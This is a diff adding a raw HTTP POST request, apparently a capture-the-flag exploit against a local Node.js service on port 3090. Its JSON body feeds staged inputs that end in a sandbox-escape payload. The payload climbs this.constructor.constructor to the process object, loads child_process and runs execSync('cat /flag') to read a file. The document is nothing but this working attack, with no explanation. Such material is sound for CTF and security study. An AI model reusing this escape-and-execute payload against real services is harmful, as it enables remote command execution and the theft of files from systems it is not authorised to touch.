@@ -1,0 +1,31 @@
+POST / HTTP/1.1
+Host: 127.0.0.1:3090
+Content-Length: 403
+sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
+sec-ch-ua-platform: "Linux"
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+Content-Type: application/json
+Connection: close
+
+{"stdin":["ls","1",
+"2",
+"3",
+"4",
+"5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20",
+"21",
+"22",
+"23",
+"5",
+"3197973533",
+"stdin2",
+"read"
+],
+"stdin2":[
+"2",
+"3197973547", 
+"stdin3",
+"read",
+"0"
+],"stdin3":["(function (){ return this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag').toString();})",
+"0"]}
